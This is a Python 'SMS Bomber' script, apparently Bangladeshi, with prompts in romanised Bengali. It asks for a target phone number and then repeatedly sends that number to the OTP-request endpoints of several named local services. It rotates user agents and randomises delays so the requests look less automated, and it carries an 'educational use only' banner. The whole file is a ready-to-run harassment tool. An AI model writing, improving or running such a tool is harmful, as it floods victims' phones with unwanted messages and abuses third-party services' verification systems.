import requests
import json
import time
import random
import sys
import os

# ANSI escape codes for colors
class Colors:
    GREEN = '\033[92m'  # Success er jonno green
    RED = '\033[91m'    # Failed er jonno red
    YELLOW = '\033[93m' # Info er jonno yellow
    CYAN = '\033[96m'   # Input er jonno cyan
    RESET = '\033[0m'   # Reset color

# "SM" ASCII Art
SM_ART = f"""
{Colors.CYAN}
   _____ __  __ 
  / ____|  \/  |
 | (___ | \  / |
  \___ \| |\/| |
  ____) | |  | |
 |_____/|_|  |_|
        
        {Colors.YELLOW}=== SM CORPORATE 🍁 SMS Bomber ==={Colors.RESET}
        Coded by: SM
        For Educational Use Only!
"""

# API list (Bangladeshi services)
APIs = [
    {"name": "Nagad OTP", "url": "https://www.nagad.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Pathao OTP", "url": "https://pathao.com/api/otp/send", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Daraz OTP", "url": "https://daraz.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Chaldal OTP", "url": "https://chaldal.com/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    # Add more APIs as needed
]

# Random User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")

def validate_phone(phone):
    return phone.isdigit() and len(phone) == 11 and phone.startswith("01")

def send_request(api, phone):
    url = api["url"]
    data = json.loads(json.dumps(api["data"]).replace("{number}", phone))
    headers = {
        "Content-Type": "application/json",
        "User-Agent": random.choice(USER_AGENTS),
    }

    try:
        response = requests.post(url, json=data, headers=headers, timeout=10)
        if response.status_code < 400:  # Success mane OTP send hoise
            return {"success": True, "status": "Success"}
        else:
            return {"success": False, "status": "Failed"}
    except requests.RequestException:
        return {"success": False, "status": "Failed"}

def main():
    clear_screen()
    print(SM_ART)
    
    # Phone number input
    phone = input(f"{Colors.CYAN}Bangladeshi number dao (e.g., 01712345678): {Colors.RESET}").strip()
    if not validate_phone(phone):
        print(f"{Colors.RED}Number vul! 11 digit hote hobe, 01 diye start hobe.{Colors.RESET}")
        input("Enter press kore exit koro...")
        return

    # Message count input
    try:
        count = int(input(f"{Colors.CYAN}Koto message pathabo (1-100): {Colors.RESET}").strip())
        if not 1 <= count <= 100:
            raise ValueError
    except ValueError:
        print(f"{Colors.RED}Vul count! 1-100 er moddhe hobe.{Colors.RESET}")
        input("Enter press kore exit koro...")
        return

    # Delay input
    try:
        delay = float(input(f"{Colors.CYAN}Koto second delay debo (e.g., 2): {Colors.RESET}").strip())
        if delay < 0:
            raise ValueError
    except ValueError:
        print(f"{Colors.RED}Vul delay! 0 or beshi hobe.{Colors.RESET}")
        input("Enter press kore exit koro...")
        return

    print(f"\n{Colors.YELLOW}{phone} e {count} ta message pathacchi (delay: {delay}s)...{Colors.RESET}")

    for i in range(count):
        api = random.choice(APIs)  # Random ekta API select
        result = send_request(api, phone)
        if result["success"]:
            print(f"{Colors.GREEN}[{i+1}/{count}] {api['name']}: Success{Colors.RESET}")
        else:
            print(f"{Colors.RED}[{i+1}/{count}] {api['name']}: Failed{Colors.RESET}")
        time.sleep(delay + random.uniform(0, 1))  # Delay + random 0-1s

    print(f"\n{Colors.GREEN}SMS bombing completed successfully!{Colors.RESET}")
    input("Press enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Stopped by user.{Colors.RESET}")
        sys.exit(0)
